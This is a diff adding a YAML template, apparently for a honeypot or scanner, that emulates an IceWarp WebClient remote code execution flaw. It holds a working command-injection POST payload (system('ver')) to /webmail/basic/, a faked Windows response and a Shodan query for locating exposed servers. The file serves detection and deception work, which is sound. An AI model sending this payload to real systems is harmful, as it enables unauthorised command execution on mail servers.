@@ -1,0 +1,29 @@
+id: icewarp-webclient-rce
+info:
+  name: IceWarp WebClient - Remote Code Execution
+  author: gy741
+  description: 'IceWarp WebClient is susceptible to remote code execution.
+
+    '
+  severity: critical
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-77
+  metadata:
+    max-request: 1
+    shodan-query: title:"icewarp"
+  tags: icewarp,rce
+traps:
+- request:
+    method: POST
+    path: /webmail/basic/
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: '_dlg[captcha][target]=system(\''ver\'')\
+
+      '
+  response:
+    status_code: 302
+    headers: {}
+    body: Microsoft Windows [Version
